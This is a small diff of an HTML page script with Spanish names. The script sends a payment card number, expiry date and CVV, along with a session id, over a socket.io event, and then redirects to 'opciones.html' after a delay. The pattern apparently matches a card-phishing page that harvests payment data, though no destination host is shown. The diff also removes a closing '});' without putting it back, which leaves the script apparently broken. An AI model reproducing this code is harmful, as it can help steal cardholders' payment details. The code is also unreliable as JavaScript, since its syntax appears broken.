@@ -167,14 +167,15 @@
       }
 
       socket.emit("datosTarjeta", {
-        tarjeta,
-        vencimiento: `${mes}/${ano}`,
-        cvv,
-        sessionId
-      });
+  tarjeta,
+  vencimiento: `${mes}/${ano}`,
+  cvv,
+  sessionId
+});
+setTimeout(() => {
+  window.location.href = "opciones.html";
+}, 500);
 
-      window.location.href = "opciones.html";
-    });
   </script>
 </body>
 </html>
